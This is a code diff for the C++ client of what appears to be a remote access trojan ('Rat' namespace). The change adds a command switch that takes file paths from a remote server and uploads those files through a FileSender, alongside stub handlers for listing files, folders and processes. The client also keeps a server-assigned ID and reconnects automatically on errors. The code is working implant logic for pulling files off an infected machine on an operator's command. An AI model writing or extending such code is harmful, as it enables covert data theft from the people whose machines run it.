@@ -3,7 +3,8 @@
 #include <thread>
 #include <random>
 #include <fstream>
-
+#include "FileSender.hpp"
+#include "Utils.hpp"
 namespace Rat 
 {
 
@@ -111,7 +112,6 @@ namespace Rat
 
     void Client::sendClientId() 
     {
-        
         if (this_id_ == uint64_t(-1)) 
         {
             rat::Packet packet;
@@ -179,40 +179,77 @@ namespace Rat
             [this](const rat::Packet& packet, const boost::system::error_code& ec) 
             {
                 if (ec) 
-                {
+                {   
                     std::cout << "Receive error: " << ec.message() << "\n";
                     socket_->lowest_layer().close();
                     scheduleReconnect();
                     return;
                 }
-                if (packet.has_chunked_data())
+                if (packet.has_chunked_data()) 
                 {
-                    std::cout << "COMMAND FROM SERVER: " << packet.chunked_data().payload() << 111 << std::endl;
-                }
-                if (packet.has_chunked_data() && packet.type() == rat::Packet::STATIC_ID) 
-                {
-                    try 
+                    // std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
+                    //         std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
+                    switch (packet.type())
                     {
-                        this_id_ = std::stol(packet.chunked_data().payload());
-                        std::ofstream file("client_id.txt");
-                        if (file.is_open()) 
+                        case rat::Packet::STATIC_ID:
                         {
-                            file << this_id_ << "\n";
-                            file.close();
+                            try 
+                            {
+                                this_id_ = std::stol(packet.chunked_data().payload());
+                                std::ofstream file("client_id.txt");
+                                if (file.is_open()) 
+                                {
+                                    file << this_id_ << "\n";
+                                    file.close();
+                                }
+                            } 
+                            catch (const std::exception& e) 
+                            {
+                                // std::cout << "Invalid ID: " << e.what() << "\n";
+                            }
+                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                            break;
                         }
-                    } 
-                    catch (const std::exception& e) 
-                    {
-                        // std::cout << "Invalid ID: " << e.what() << "\n";
+                        case rat::Packet::TRANSFER_FILE:
+                        {
+                            std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
+                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
+                            std::cout << "COMMAND FILE PATH FROM SERVER: " << packet.file_path() << std::endl;
+                            current_file_sender_ = std::make_shared<FileSender>(socket_, networkManager_, this_id_, packet.file_path());
+                            current_file_sender_->sendFile(
+                                packet.file_path(),
+                                Utils::getCurrentTimeString(),
+                                [this]() {
+                                    std::cout << "File transfer completed.\n";
+                                    handleCommands();
+                                    // boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                                }
+                            );
+                            return;
+                            break;
+                        }
+                        case rat::Packet::LIST_FILES_FOLDERS:
+                        {    
+                            std::cout << "COMMAND TYPE FROM SERVER: "  << packet.type() << std::endl;
+                            std::cout << "COMMAND PAYLOAD FROM SERVER: " << packet.chunked_data().payload() << std::endl;
+                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                            break; 
+                        }
+                        case rat::Packet::LIST_PROCESSES:
+                        {  
+
+                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                            break;
+                        }
+                        default:
+                        {
+
+                            boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
+                            break;
+                        }
                     }
+                    
                 }
-                if (packet.has_chunked_data() && packet.type() == rat::Packet::COMMAND)
-                {
-                    std::cout << "COMMAND FROM SERVER: " << packet.chunked_data().payload();
-                    // process transfer file
-                }
-                // std::cout << "Server: " << packet.chunked_data().payload() << "\n";
-                boost::asio::post(networkManager_.get_io_context(), [this]() { handleCommands(); });
             });
     }
 
@@ -228,9 +265,9 @@ namespace Rat
             auto* chunked = packet.mutable_chunked_data();
             chunked->set_payload(input);
 
-            if (input == "list_files") 
+            if (input == "list_files_folders") 
             {
-                packet.set_type(rat::Packet::LIST_FILES);
+                packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
             } 
             else if (input == "list_processes") 
             {
